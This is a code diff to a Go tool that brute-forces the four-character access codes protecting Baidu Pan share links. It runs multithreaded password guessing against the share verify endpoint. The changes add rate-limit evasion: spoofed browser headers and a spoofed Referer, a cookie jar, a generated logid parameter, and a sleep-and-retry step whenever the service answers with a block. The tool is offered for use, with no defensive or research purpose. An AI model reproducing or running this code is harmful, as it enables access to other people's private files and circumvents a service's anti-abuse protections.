@@ -7,11 +7,14 @@ import (
 	"os"
 	"runtime"
 	"time"
+	"strings"
 
 	"io/ioutil"
 	"net/http"
 	"net/url"
+	b64 "encoding/base64"
 )
+
 
 type BaiduYunTester struct {
 	URL     string
@@ -19,7 +22,18 @@ type BaiduYunTester struct {
 	EndWith string
 	testUrl string
 	Result  string
+	Tag     string
 	debug   bool
+}
+
+type Jar struct {
+	cookies []*http.Cookie
+}
+func (jar *Jar) SetCookies(u *url.URL, cookies []*http.Cookie) {
+	jar.cookies = cookies
+}
+func (jar *Jar) Cookies(u *url.URL) []*http.Cookie {
+	return jar.cookies
 }
 
 func NewBaiduYunTester(urlstr, startat, endwith string) (v *BaiduYunTester) {
@@ -28,7 +42,7 @@ func NewBaiduYunTester(urlstr, startat, endwith string) (v *BaiduYunTester) {
 		StartAt: startat,
 		EndWith: endwith,
 	}
-	v.testUrl = "http://pan.baidu.com/share/verify?" + urlstr[32:]
+	v.testUrl = "http://pan.baidu.com/share/verify" + urlstr[32:]
 	return
 }
 
@@ -53,30 +67,31 @@ func (this *BaiduYunTester) Run(threadCount int) string {
 		for {
 			if this.Result != "" {
 				INFO.Logf("work finished! password tested: %d time used: %d (s)",
-					i-s,
-					(time.Now().UnixNano()-inittime)/1e9,
+					i - s,
+					(time.Now().UnixNano() - inittime) / 1e9,
 				)
 				break
 			}
 			in <- toBase36(i)
-			i++
-			if i%3888 == 0 {
+			if this.Tag != "blocked" {
+				i++
+			}
+			if i % 3888 == 0 {
 				dur := time.Now().UnixNano() - lastTime
 				speed := int(3888 * 1e9 / float32(dur))
 				lastTime = time.Now().UnixNano()
 				INFO.Logf("testing [%s] %d/%d %.1f%% speed: %d/s passed: %d (s) remaining: %d (s)",
 					toBase36(i),
-					i-s,
+					i - s,
 					blockLength,
-					float32(i-s)/float32(blockLength)*100,
+					float32(i - s) / float32(blockLength) * 100,
 					speed,
-					(time.Now().UnixNano()-inittime)/1e9,
-					(blockLength-i+s)/speed,
+					(time.Now().UnixNano() - inittime) / 1e9,
+					(blockLength - i + s) / speed,
 				)
 			}
 		}
 	}()
-
 	this.Result = <-out
 	return this.Result
 }
@@ -85,7 +100,7 @@ func toBase36(v int) string {
 	const key = "0123456789abcdefghijklmnopqrstuvwxyz"
 	s := ""
 	for i := 0; i < 4; i++ {
-		s = string(rune(key[v%36])) + s
+		s = string(rune(key[v % 36])) + s
 		v /= 36
 	}
 	return s
@@ -111,23 +126,60 @@ func (this *BaiduYunTester) runWorker(in, out chan string) {
 			break
 		}
 		pwd = <-in
-		if this.runSingle(pwd) {
+		if this.Tag == "blocked" {
+			time.Sleep(time.Second*60)
+		}
+		if  this.runSingle(pwd) {
 			out <- pwd
 		}
 	}
 }
 
 func (this *BaiduYunTester) runSingle(pwd string) bool {
-	res, err := http.PostForm(this.testUrl, url.Values{"pwd": {pwd}})
+
+	client := &http.Client{Jar:jar}
+	timestamp := time.Now().Unix()
+	logid := fmt.Sprintf("%d", timestamp * 10000)
+	logid = logid + ".7649689272058051"
+	url := this.testUrl + "&t=" + fmt.Sprintf("%d", timestamp) + "&channel=chunlei&clienttype=0&web=1&logid=" + b64.StdEncoding.EncodeToString([]byte(logid))
+	//DEBUG.Log("try [" + url + "] ")
+
+	req, err := http.NewRequest("POST", url, strings.NewReader("pwd=" + pwd))
 	if err != nil {
+		this.Tag = ""
 		return false
 	}
-	bin, _ := ioutil.ReadAll(res.Body)
-	res.Body.Close()
+
+	req.Header.Set("User-Agent", "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/51.0.2704.106 Safari/537.36")
+	req.Header.Set("X-Requested-With", "XMLHttpRequest")
+	req.Header.Set("Referer", "https://pan.baidu.com/share/init?shareid=1459905072&uk=3322228950")
+	req.Header.Set("Origin", "https://pan.baidu.com")
+	req.Header.Set("Host", "pan.baidu.com")
+	req.Header.Set("Content-Type", "application/x-www-form-urlencoded")
+	//req.Header.Set("Cookie", "PANWEB=1; Hm_lvt_7a3960b6f067eb0085b7f96ff5e660b0=1470293383; Hm_lpvt_7a3960b6f067eb0085b7f96ff5e660b0=1470307945; BAIDUID=51FAFBD18D28BD50E4EC9A9900585C94:FG=1")
+
+	resp, err := client.Do(req)
+	if err != nil {
+		this.Tag = ""
+		return false
+	}
+
+	jar.cookies = resp.Cookies()
+
+	bin, err := ioutil.ReadAll(resp.Body)
+	resp.Body.Close()
+
+	if string(bin)[5:14] != `{"errno":` {
+		DEBUG.Log("try [" + pwd + "] blocked ", string(bin)[5:len(bin)])
+		this.Tag = "blocked"
+		return false
+	}
 	if string(bin)[5:16] == `{"errno":0,` {
+		this.Tag = ""
 		return true
 	}
-	DEBUG.Log("try ["+pwd+"] fail ", string(bin)[0:len(bin)])
+	DEBUG.Log("try [" + pwd + "] fail ", string(bin)[5:16])
+	this.Tag = ""
 	return false
 }
 
@@ -192,7 +244,8 @@ func main() {
 
 var (
 	DEBUG = NewLogger(os.Stderr, false, "[DEBUG] ")
-	INFO  = NewLogger(os.Stdout, true, "[INFO] ")
+	INFO = NewLogger(os.Stdout, true, "[INFO] ")
+	jar = new(Jar)
 )
 
 // 日志对象
